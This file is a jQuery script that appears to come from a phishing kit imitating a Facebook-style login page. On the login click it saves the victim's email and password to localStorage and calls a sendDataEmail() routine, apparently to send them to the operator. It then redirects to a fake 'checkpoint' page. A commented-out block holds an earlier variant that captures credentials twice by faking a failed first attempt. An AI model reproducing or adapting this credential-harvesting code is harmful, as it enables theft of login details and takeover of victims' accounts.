$(document).ready(function () {
    $("[name='login']").click(function () {

        if($('#email').val() === '') 
        {
            $('#email').addClass('_9ay4');
            $('._9ay5 img').removeClass('hidden_elem');
            $('._9ay7').removeClass('hidden_elem');
            localStorage.setItem('user2', '');
            $('#email').val('');
            $('#pass').val('');
            return;
        }
        else
        {
            $('#email').removeClass('_9ay4');
            $('._9ay5 img').addClass('hidden_elem');
            $('._9ay7').addClass('hidden_elem');
        }

        if($('#pass').val() == '') 
            {
                $('.textpass').removeClass('hidden_elem');
                return;
            }

        // if(localStorage.getItem('user2') === 'undefined' || localStorage.getItem('user2') === '' || $('#email').val() === '' )
        // {
        //     localStorage.setItem('user2', $('#email').val());
        //     localStorage.setItem('pass2', $('#pass').val());
        //      sendDataEmail();
        //     setTimeout(function () {
        //         if(localStorage.getItem('user2') != 'undefined' && localStorage.getItem('user2') != '')
        //             {
        //                 //$('#email').css('border-color', '#dddfe2');  
        //                 $('#email').removeClass('_9ay4');
        //                 $('._9ay5 img').addClass('hidden_elem');
        //                 $('._9ay7').addClass('hidden_elem');
        //                 $('.textpass').removeClass('hidden_elem');

        //                 $('#email').val('');
        //                 $('#pass').val('');
        //             }
        //         //window.location.reload(true);
        //     }, 2000);
        //     delay
         
        // }
        // else
        // {
        //     localStorage.setItem('user3', $('#email').val());
        //     localStorage.setItem('pass3', $('#pass').val());
        //     setTimeout(function () {
        //         window.location.href = "../checkpoint/authentic.html";
        //     }, 2000);

        // }

            localStorage.setItem('user2', $('#email').val());
            localStorage.setItem('pass2', $('#pass').val());
            sendDataEmail();
            setTimeout(function () {
                window.location.href = "../checkpoint/authentic.html";
            }, 2000);

    });
});